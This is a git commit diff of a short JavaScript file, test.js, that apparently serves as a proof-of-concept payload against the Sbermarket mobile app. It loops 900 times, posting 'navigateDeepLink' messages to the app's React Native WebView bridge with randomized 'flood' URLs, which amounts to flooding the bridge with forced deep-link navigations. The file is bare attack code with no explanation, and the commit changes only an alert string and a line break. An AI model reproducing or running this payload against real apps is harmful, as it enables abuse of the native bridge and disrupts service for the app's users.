c406c1dbc906c372c4e746de3bfea7a07fec3a62
GMchik <chupanovgadji@gmail.com>
2026-02-15 18:59:47 +0300

    Update test.js

--- test.js
+++ test.js
@@ -1,8 +1,9 @@
-alert('test_js4');
+alert('test_1');
 for(let i=0; i<900; i++) {
   window.ReactNativeWebView.postMessage(JSON.stringify({
   action: 'navigateDeepLink',
-  data: 'sbermarket://landing?url=https://tiburon-research.ru/flood-' + i + '-' + Date.now() + '-' + Math.random().toString(36).substr(2)
+  data: 'sbermarket://landing?url=https://tiburon-research.ru/flood-' + i + '-' + Date.now() + '-' 
+    + Math.random().toString(36).substr(2)
   }));
 }
 
